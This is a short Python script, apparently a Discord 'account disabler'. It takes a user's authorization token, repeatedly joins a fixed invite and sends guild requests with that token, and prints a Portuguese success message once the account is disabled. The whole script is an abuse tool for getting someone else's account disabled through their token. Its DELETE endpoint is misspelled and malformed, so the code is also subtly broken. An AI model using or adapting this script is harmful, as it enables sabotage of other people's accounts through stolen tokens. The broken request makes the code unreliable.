import requests
import json
import sys
import time
import os

token = input("[+] Enter Token: ")

while True:
    api = requests.get("https://discordapp.com/api/v6/invite/hwcVZQw")
    data = api.json()
    check = requests.get("https://discordapp.com/api/v6/guilds/" + data['guild']['id'], headers={"Authorization": token})
    stuff = check.json()
    requests.post("https://discordapp.com/api/v6/invite/hwcVZQw", headers={"Authorization": token})
    requests.delete("https://discordapp.com/api/v6/guiilds" + data['guild']['id'], headers={"Authorization": token})

    if stuff['code'] == 0:
        print("[!] Conta Desabilitada com Sucesso!")
        break
        
        
        